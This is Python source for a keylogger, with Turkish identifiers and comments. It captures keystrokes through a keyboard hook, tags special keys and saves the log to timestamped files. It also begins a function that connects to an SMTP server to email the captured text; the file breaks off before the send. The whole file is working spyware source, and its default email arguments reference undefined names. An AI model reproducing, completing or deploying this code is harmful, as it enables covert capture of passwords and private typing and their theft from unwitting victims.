import keyboard
import smtplib
from threading import Timer
from datetime import datetime
import sifre

class Keylogger:
    def __init__(self, sure, rapor):
        self.sure = sure
        self.rapor = rapor
        self.log = ""
        self.baslangic = datetime.strftime(datetime.today() , '%d-%m-%Y-%Hh-%Mm')
        self.bitis = datetime.strftime(datetime.today() , '%d-%m-%Y-%Hh-%Mm')


    def tus_yakalama(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space":
                name = " "
            elif name == "enter":
                name = "[ENTER]"
            elif name == "tab":
                name = "[TAB]"
            elif name == "ctrl":
                name = "[CTRL]"
            elif name == "alt":
                name = "[ALT]"
            elif name == "backspace":
                name = "[SIL]"
            elif name == "shift":
                name = "[^]"
            elif name == "!":
                name = "[!]"
            elif name == "down":
                name = "[ALT_TUS]"
            elif name == "right":
                name = "[SAG_TUS]"
            elif name == "left":
                name = "[SOL_TUS]"
            elif name == "up":
                name = "[ÜST_TUS]"
        self.log += name


    def dosya_isimlendir(self):
        baslama_zamani = str(self.baslangic)
        bitis_zamani = str(self.bitis)
        self.dosya_adi = f"log{baslama_zamani}_{bitis_zamani}"

    def dosya_olustur(self):
        with open(f"{self.dosya_adi}.txt", "w+") as d:
            print(self.log, file=d)
        print(f"[+] Yeni girdi: {self.dosya_adi}.txt") # Terminalden cikti verir

    def mail_gonderme(self, icerik, mail=MAIL_USER, sifre=MAIL_SIFRE):
        server = smtplib.SMTP(host=MAIL_SMTP, port=SMTP_PORT)
        #TLS modunda sifreleme icin :
       
